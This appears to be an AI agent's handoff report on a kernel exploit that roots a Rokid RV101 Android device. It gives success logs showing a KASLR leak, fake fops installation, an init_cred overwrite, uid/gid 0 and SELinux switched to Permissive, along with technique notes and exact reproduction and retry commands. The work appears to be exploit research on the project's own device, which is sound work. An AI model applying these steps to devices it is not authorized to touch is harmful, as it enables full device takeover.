# GhostLock RV101 — Work Status Handoff v13 (thirteenth agent: Clean Root (uid=0 gid=0) achieved)

> 中文版：[GHOSTLOCK_HANDOFF_V13.md](GHOSTLOCK_HANDOFF_V13.md)

> Updated 2026-08-22. This round (the thirteenth agent) completed on the real device (<DEVICE_SERIAL>):
> **1. Clean Root achieved: child `uid=0` and `gid=0`, with `id` returning `uid=0(root) gid=0(root) groups=0(root)`.**
> **2. Settled that the kernel-side gid repair (a 4th reclaim) panics, and switched to a user-space `setgid(0)` fix.**
> **3. Wrote the boot health gate + automatic retry into `scripts/boot_run_loop.sh` (Branch C).**

---

## 0. The most critical conclusion (read first)

> **【Clean Root achieved】**
> Evidence (`reports/ghostlock_runlogs/run_w2_clean_v959_134613.log`, v959, ~110s after boot):
> ```
> [+] KASLR: slide=0x0000002480400000 base=0xffffffe488400000 (2 anchors)
> [*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 1, ...)
> [*] round 1/1: child=8967 prev=0xffffff801dac04c8 prev2=0xffffff801dac04c8 stable=1 task=0xffffff801dac0000
> [*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
> [+] child is root!
> [+] GHOSTLOCK ROOT: uid=0 gid=0
> uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
> Permissive
> [*] [T+110439ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
> ```
> Device-side confirmation: `getenforce=Permissive`, `/data/local/tmp/su_gl` is `-rwxr-xr-x 1 root …`.
> **This satisfies handoff #13's Full success** (uid=0 and gid=0, SELinux Permissive, a fully functional root shell, no heap read).

> **【The correct answer for the gid repair = user-space `setgid(0)`, not kernel-side repair】**
> - v958 (kernel-side `do_gid_repair()`, a 4th reclaim cycle): **panics**. Evidence
>   `run_w2_clean_v958_133632.log`: after FOPS LANDED + two successful cred writes, the 4th
>   `prepare_good_kernel_page()` gave `dip=0 calm=3604` (the leak slab is never discarded, because the memfd pins accumulated
>   over the first three rounds starve the per-CPU partial chain), pselect walked a garbage fake page → device reboot
>   (the log breaks at `consumer punch 1/5`, followed by `device not found`).
> - v959 (user-space fix): after the child obtains `init_cred` (uid=0, CAP_FULL_SET), it calls
>   `setgroups(0,NULL); setgid(0);` before reporting back — CAP_SETGID makes `setgid(0)` go through `prepare_creds`+`commit_creds`
>   to swap in clean cred (uid=0 gid=0 usage=1). **Zero extra reclaim, zero panic risk**. Measured gid=0.

---

## 1. The real state at the start of this round (What was true at the start)

- Device: after the previous agent (V12) finished, it had been up 16 min with `getenforce=Permissive` (V12's residual root state).
- source: `do_cred_write()` was still mode-5 (`data_addr(INIT_CRED)+8, target, 5`), with no `do_gid_repair`.
- binary sha1 = `2850496c18dc3ca5fa9340896d2110ef216e030e` (identical before this agent started).
- No parallel agent activity (no new non-this-agent runlog after the start).

## 2. What changed this round (What changed in source/build)

- `src/main.c`:
  1. The `'C'` handler in `child_main` gained a **user-space gid fix**: `setgroups(0,NULL); setgid(0);`,
     and the report changed from a single `uid` to `uint32_t ids[2]` (uid+gid).
  2. W2 round loop: `child uid = %u … gid = %u` prints uid/gid together; `if (ids[0]==0)` decides root.
  3. **Removed** the kernel-side `do_gid_repair()` (the v958 attempt) and left a comment (v9.59 NOTE) explaining that a 4th
     reclaim gives dip=0 → panic, hence the switch to user space.
- `src/common.h`: added `#include <grp.h>` (needed for `setgroups`).
- `scripts/boot_run_loop.sh` (new): reboot → gate on `nr_threads<2500` → `timeout 240` to run W2 →
  grep for success → automatic retry. **Note: Windows adb.exe output is CRLF, so `get-state` must use `tr -d '\r'`**
  (otherwise `[ "$ST" = "device" ]` is always false and boot detection fails — hit and fixed by this agent).

## 3. What tests ran (What tests ran)

| # | binary | boot | Result |
|---|---|---|---|
| 1 | v958 (kernel repair) | boot1 @213s | FOPS install 6/6 MISSED (reclaim flake, mm-leak all succeeded) |
| 2 | v958 | boot2 @240s | FOPS install 6/6 MISSED (same as above) |
| 3 | v958 | boot3 @~110s | FOPS **LANDED veh9** + cred write succeeded → **do_gid_repair 4th reclaim dip=0 → panic** |
| 4 | v959 (user-space fix) | boot4 | FOPS install MISSED (reclaim flake) |
| 5 | v959 | boot5 @~110s | **SUCCESS: uid=0 gid=0**, `uid=0(root) gid=0(root)`, Permissive |

> reclaim (mode-5 FOPS install) is still a ~50%/boot flake: 2 of 5 boots LANDED (one of which went
> all the way to clean root). mm-leak succeeds 100% on a healthy boot (`Threads:4097`). Consistent with V12.

## 4. Whether the gid repair succeeded (Whether the gid repair succeeded)

**Yes, but via the user-space path, not the kernel-side path proposed by handoff #13.**

- The kernel-side `do_gid_repair()` (a 4th reclaim) **failed and panicked** (see §0 and §3 #3). Root cause:
  the memfd pins accumulated by the first three reclaim rounds make the 4th round's `dip=0`, the leak slab is never discarded → pselect walks a
  garbage fake page → device reboot.
- The user-space `setgid(0)` **succeeded**: `child uid = 0 (0x00000000) gid = 0 (0x00000000)`,
  and `id` returns `uid=0(root) gid=0(root) groups=0(root)`. This confirms mode-5's uid path is unchanged and the gid is
  zeroed by the child itself using CAP_SETGID.

## 5. Exact next commands (Exact next commands)

Command 1 — reproduce Clean Root (**first confirm nr_threads<3000, otherwise reboot**):
```bash
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"; S="<DEVICE_SERIAL>"
"$ADB" -s $S shell cat /proc/loadavg      # the 4th field total must be < 3000
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root
./scripts/ghostlock_run.sh w2_clean v959 \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 /data/local/tmp/ghostlock_rv101"
# success criterion: "gid = 0 (0x00000000)" and "uid=0(root) gid=0(root)" appear in the log
```
Command 2 — automatic retry (Branch C, already implemented; reboots automatically until success, up to N boots):
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root
./scripts/boot_run_loop.sh 6 w2_clean v959 "gid = 0 (" \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1" /data/local/tmp/ghostlock_rv101
```
Command 3 — rebuild/push (if the source is changed again):
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root/source_code/ghostlock_rv101
NDKBIN="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/ndk/android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64/bin"
"$NDKBIN/clang.exe" --target=aarch64-linux-android31 -O2 -Wall -Wextra \
  -Wno-unused-parameter -Wno-sign-compare -fno-stack-protector -fPIE -Isrc \
  -include target_rv101.h -o build/ghostlock_rv101 src/main.c src/util.c src/route.c \
  -pie -static-libgcc -pthread
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
"$ADB" -s <DEVICE_SERIAL> push build/ghostlock_rv101 /data/local/tmp/ghostlock_rv101
"$ADB" -s <DEVICE_SERIAL> shell "chmod 755 /data/local/tmp/ghostlock_rv101"
```

## 6. Remaining / next refinements

1. **reclaim (mode-5 FOPS install) is still the only flake** (~50%/boot). It has been masked by automating
   boot_run_loop.sh, but the root cause (SKB head-grab + o2 churn burying the leak slab) is unsolved. To press it down further: reduce the kernel
   stack volume of flood/dummy, or switch the reclaim carrier (V10 Appendix H/J).
2. **The root shell's gid repair is now clean**, but `context=u:r:kernel:s0` (the kernel context of cred=init_cred)
   is not the typical `u:r:su:s0`. Functionality is unaffected (it can write /sys/fs/selinux/enforce and write /data/local/tmp). If a more "normal"
   app context is needed, a non-init_cred root cred would be required (beyond this agent's scope).
3. Parallel agent coordination: there was no parallel agent at the start of this round; if the next agent observes a non-this-agent runlog, first confirm a single executor.

## Appendix A: Final binary and outputs

- binary sha1 (local=device): `ec342a5aaf999d0a41ccd7ccc24d028e8b7f637e` (v959, user-space gid fix).
- Success log: `reports/ghostlock_runlogs/run_w2_clean_v959_134613.log`.
- Key comparison (kernel-side repair panic): `reports/ghostlock_runlogs/run_w2_clean_v958_133632.log`.
- New script: `scripts/boot_run_loop.sh`.
